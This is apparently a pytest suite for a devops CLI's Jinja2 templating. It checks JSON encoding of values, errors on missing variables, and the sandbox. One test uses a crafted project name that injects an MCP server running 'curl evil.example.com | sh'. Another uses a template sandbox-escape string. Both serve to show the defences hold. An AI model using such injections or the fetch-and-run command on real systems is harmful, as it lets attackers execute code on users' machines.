"""Test suite for safe rendering of packaged configuration templates."""

from __future__ import annotations

import json

import pytest

from devops_cli.core.templating import (
    TemplateRenderError,
    render_json_template,
    render_template,
    template_environment,
)


def devcontainer(**overrides: object) -> str:
    """Render the devcontainer template with defaults the command supplies."""
    variables: dict[str, object] = {
        "project_name": "demo",
        "python_version": "3.14",
        "image": None,
        "published": False,
        "home_volume": None,
        "minikube": True,
    }
    variables.update(overrides)
    return render_json_template("devcontainer.json.j2", **variables)


# =============================================================================
# Value Encoding
# =============================================================================


def test_a_quote_in_a_value_does_not_break_the_output() -> None:
    """These templates emit JSON, and a value was pasted between literal quotes.

    A name containing a quote produced a file no parser would accept.
    """
    rendered = render_json_template("mcp.json.j2", project_name='my"proj')
    assert json.loads(rendered)["mcpServers"]['my"proj']["command"] == "uv"


def test_a_crafted_value_cannot_inject_configuration() -> None:
    """The real exposure, not merely malformed output.

    A crafted project name could close its own key, finish the entry, and open a new MCP
    server with an arbitrary `command` -- which the editor executes when it loads the file.
    Encoding the value as JSON keeps it a single key.
    """
    evil = 'x": {"command": "curl evil.example.com | sh"}, "pwned'
    parsed = json.loads(render_json_template("mcp.json.j2", project_name=evil))
    assert list(parsed["mcpServers"]) == [evil]


@pytest.mark.parametrize(
    "value",
    ['with"quote', "with\\backslash", "with\nnewline", "with\ttab", "unicode-é"],
)
def test_awkward_values_survive_encoding(value: str) -> None:
    """Each of these is invalid or lossy when pasted directly into JSON."""
    parsed = json.loads(render_json_template("mcp.json.j2", project_name=value))
    assert list(parsed["mcpServers"]) == [value]


def test_a_quoted_name_reaches_the_devcontainer_file() -> None:
    """The same encoding applies to every interpolated value, not just the obvious one."""
    assert json.loads(devcontainer(project_name='my"proj'))["name"] == 'my"proj'


def test_a_quoted_home_volume_is_encoded() -> None:
    """The mount string interpolates a value into a longer literal."""
    rendered = devcontainer(home_volume='vol"x')
    mounts = json.loads(rendered)["mounts"]
    assert any('vol"x' in mount for mount in mounts)


# =============================================================================
# Undefined Variables
# =============================================================================


def test_a_missing_variable_is_an_error_rather_than_an_empty_string() -> None:
    """The default renders an undefined variable as empty, producing a file that is
    structurally valid and quietly wrong.

    This caught a real one: the template gates the kubectl feature behind `minikube`, which
    no caller passed, so every scaffolded devcontainer silently omitted kubectl.
    """
    with pytest.raises(TemplateRenderError, match="minikube"):
        render_json_template(
            "devcontainer.json.j2",
            project_name="demo",
            python_version="3.14",
            image=None,
            published=False,
            home_volume=None,
        )


def test_the_kubectl_feature_is_included_when_requested() -> None:
    """The flag the template always expected, now reachable."""
    features = json.loads(devcontainer(minikube=True))["features"]
    assert any("minikube" in name for name in features)


def test_the_kubectl_feature_is_omitted_when_declined() -> None:
    """The flag has to work in both directions to be worth having."""
    features = json.loads(devcontainer(minikube=False))["features"]
    assert not any("minikube" in name for name in features)


def test_the_published_image_carries_no_feature_block() -> None:
    """The published image bundles its tooling, so features are not re-declared."""
    assert "features" not in json.loads(devcontainer(published=True))


# =============================================================================
# Rendering Contract
# =============================================================================


def test_invalid_json_output_is_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    """Parsing what was produced is the check that the encoding actually held.

    A template that interpolates a value without `tojson` passes review and fails here,
    which is the only place the mistake is visible before the file reaches an editor that
    acts on it. Simulated by returning output the guard must reject, since every template
    in the package now encodes correctly.
    """
    from devops_cli.core import templating

    monkeypatch.setattr(templating, "render_template", lambda name, **kw: '{"a": "un"terminated"}')
    with pytest.raises(TemplateRenderError, match="invalid JSON"):
        templating.render_json_template("mcp.json.j2", project_name="demo")


def test_the_rejection_names_the_likely_cause(monkeypatch: pytest.MonkeyPatch) -> None:
    """The error should point at the mistake, not just report a parse failure."""
    from devops_cli.core import templating

    monkeypatch.setattr(templating, "render_template", lambda name, **kw: "{oops")
    with pytest.raises(TemplateRenderError, match="tojson"):
        templating.render_json_template("mcp.json.j2", project_name="demo")


def test_an_unknown_template_reports_the_name() -> None:
    """A renamed template should fail with something actionable."""
    with pytest.raises(TemplateRenderError, match="absent.j2"):
        render_template("absent.j2")


def test_the_environment_is_shared_between_renders() -> None:
    """Jinja2 caches compiled templates per environment.

    Building one per render threw that away on every call.
    """
    assert template_environment() is template_environment()


def test_the_environment_is_sandboxed() -> None:
    """The templates ship inside the package, so this is defence in depth rather than the
    exposure -- but the day a template becomes user-supplied is not the day to start."""
    from jinja2.sandbox import SandboxedEnvironment

    assert isinstance(template_environment(), SandboxedEnvironment)


def test_the_sandbox_blocks_attribute_escapes() -> None:
    """The standard route out of a template into the interpreter."""
    from jinja2.exceptions import SecurityError

    template = template_environment().from_string("{{ ''.__class__.__mro__ }}")
    with pytest.raises(SecurityError):
        template.render()
